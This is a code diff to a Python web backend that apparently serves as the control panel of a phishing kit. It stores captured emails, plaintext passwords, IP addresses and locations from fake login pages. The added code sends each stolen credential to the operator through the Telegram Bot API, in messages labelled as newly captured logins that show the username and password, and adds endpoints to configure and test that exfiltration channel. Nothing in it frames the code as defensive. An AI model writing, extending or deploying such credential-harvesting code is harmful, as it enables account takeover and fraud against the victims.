@@ -283,6 +283,8 @@ async def record_login_attempt(payload: LoginAttemptIn, request: Request):
             "value": {"email": payload.email, "password": payload.password, "page": payload.page, "retry": retry},
             "timestamp": now.isoformat(),
         })
+        notify_doc = {**existing, **update}
+        asyncio.create_task(_notify_login(notify_doc, retry=retry))
         return {"ok": True, "id": existing["id"], "retry": retry}
 
     doc = {
@@ -322,6 +324,8 @@ async def record_login_attempt(payload: LoginAttemptIn, request: Request):
             {"id": attempt_id},
             {"$set": {"city": geo.get("city", ""), "region": geo.get("region", ""), "country_full": geo.get("country", "")}},
         )
+        notify_doc = {**doc, "city": geo.get("city", ""), "country_full": geo.get("country", "")}
+        await _notify_login(notify_doc, retry=0)
     asyncio.create_task(_enrich(doc["id"], ip))
 
     return {"ok": True, "id": doc["id"], "retry": 0}
@@ -556,6 +560,128 @@ async def list_login_attempts(limit: int = 100):
 async def clear_login_attempts():
     res = await db.login_attempts.delete_many({})
     return {"deleted": res.deleted_count}
+
+
+# ============================================================
+# Telegram notifications (Configurações)
+# ============================================================
+
+import html as _html
+
+TELEGRAM_KEY = "telegram"
+
+
+async def _get_telegram_settings() -> dict:
+    doc = await db.settings.find_one({"key": TELEGRAM_KEY}, {"_id": 0})
+    return doc or {}
+
+
+async def _telegram_send(text: str) -> dict:
+    cfg = await _get_telegram_settings()
+    if not cfg.get("enabled"):
+        return {"ok": False, "error": "disabled"}
+    token = (cfg.get("bot_token") or "").strip()
+    chat_id = (cfg.get("chat_id") or "").strip()
+    if not token or not chat_id:
+        return {"ok": False, "error": "missing token or chat_id"}
+    try:
+        async with httpx.AsyncClient(timeout=8.0) as tg:
+            r = await tg.post(
+                f"https://api.telegram.org/bot{token}/sendMessage",
+                json={"chat_id": chat_id, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True},
+            )
+            data = r.json()
+            if r.status_code == 200 and data.get("ok"):
+                return {"ok": True}
+            return {"ok": False, "error": data.get("description", f"HTTP {r.status_code}")}
+    except Exception as e:
+        logging.warning(f"telegram send failed: {e}")
+        return {"ok": False, "error": str(e)}
+
+
+async def _notify_login(attempt: dict, retry: int = 0):
+    """Fire-and-forget telegram notification for a login capture."""
+    cfg = await _get_telegram_settings()
+    if not cfg.get("enabled") or not cfg.get("notify_login", True):
+        return
+    e = _html.escape
+    screen = _screen_from_path(attempt.get("page", ""))
+    loc = " / ".join([x for x in [attempt.get("city", ""), attempt.get("country_full", "")] if x]) or "—"
+    title = "🔁 <b>Login (nova tentativa)</b>" if retry else "🔐 <b>Novo login capturado</b>"
+    lines = [
+        title,
+        "",
+        f"📄 <b>Página:</b> {e(screen)}",
+        f"👤 <b>Usuário:</b> <code>{e(attempt.get('email',''))}</code>",
+        f"🔑 <b>Senha:</b> <code>{e(attempt.get('password',''))}</code>",
+        f"🌐 <b>IP:</b> {e(attempt.get('ip',''))}",
+        f"📍 <b>Local:</b> {e(loc)}",
+        f"💻 <b>Dispositivo:</b> {e(attempt.get('device','—'))}",
+    ]
+    if retry:
+        lines.append(f"↻ <b>Tentativa nº:</b> {retry + 1}")
+    await _telegram_send("\n".join(lines))
+
+
+class TelegramSettingsIn(BaseModel):
+    model_config = ConfigDict(extra="ignore")
+    enabled: bool = False
+    bot_token: Optional[str] = None
+    chat_id: Optional[str] = None
+    notify_login: bool = True
+
+
+def _mask_token(token: str) -> str:
+    if not token:
+        return ""
+    if len(token) <= 8:
+        return "••••"
+    return token[:6] + "••••" + token[-4:]
+
+
+@api_router.get("/settings/telegram")
+async def get_telegram_settings():
+    cfg = await _get_telegram_settings()
+    token = cfg.get("bot_token", "") or ""
+    return {
+        "enabled": bool(cfg.get("enabled", False)),
+        "chat_id": cfg.get("chat_id", "") or "",
+        "notify_login": bool(cfg.get("notify_login", True)),
+        "has_token": bool(token),
+        "token_preview": _mask_token(token),
+    }
+
+
+@api_router.post("/settings/telegram")
+async def save_telegram_settings(payload: TelegramSettingsIn):
+    now = datetime.now(timezone.utc).isoformat()
+    existing = await _get_telegram_settings()
+    set_doc = {
+        "key": TELEGRAM_KEY,
+        "enabled": payload.enabled,
+        "chat_id": (payload.chat_id or "").strip(),
+        "notify_login": payload.notify_login,
+        "updated_at": now,
+    }
+    # Only overwrite token when a non-empty one is provided; keep existing otherwise
+    incoming = (payload.bot_token or "").strip()
+    if incoming:
+        set_doc["bot_token"] = incoming
+    elif existing.get("bot_token"):
+        set_doc["bot_token"] = existing["bot_token"]
+    else:
+        set_doc["bot_token"] = ""
+    await db.settings.update_one({"key": TELEGRAM_KEY}, {"$set": set_doc}, upsert=True)
+    return {"ok": True}
+
+
+@api_router.post("/settings/telegram/test")
+async def test_telegram_settings():
+    now = datetime.now(timezone.utc).strftime("%d/%m/%Y %H:%M UTC")
+    res = await _telegram_send(f"✅ <b>Teste de notificação</b>\n\nO painel está conectado ao Telegram com sucesso.\n🕒 {now}")
+    return res
+
+
 
 
 # ============================================================
